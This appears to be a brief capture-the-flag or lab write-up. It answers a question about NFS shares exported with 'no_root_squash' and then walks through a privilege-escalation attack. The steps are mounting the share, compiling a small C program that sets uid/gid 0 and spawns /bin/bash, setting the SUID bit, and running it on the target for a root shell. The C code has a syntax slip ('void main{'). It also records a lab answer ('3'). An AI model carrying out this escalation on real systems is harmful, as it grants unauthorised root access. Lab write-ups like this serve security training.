How many shares have the "no_root_squash" option enabled?

All the folders listed have this attribute set.

Answer: 3

Gain a root shell on the target system

Mount the /tmp folder as root on the attack machine:
‘mount -o rw <IP>:/tmp </folder>’

Then create a file that like the following, which executes bash as root user:

#include <stdio.h>
        #include <sys/types.h>
        #include <stdlib.h>
        
        void main{
            setgid(0);
            setuid(0);
            system("/bin/bash");
        }  

Compile it:
‘gcc <file.c> -o <file> -w’

And set the SUID bit.

Then leave the mounted folder and unmount it:
umount <folder>

Afterwards you can execute the created binary in the /tmp folder on the victim's box.
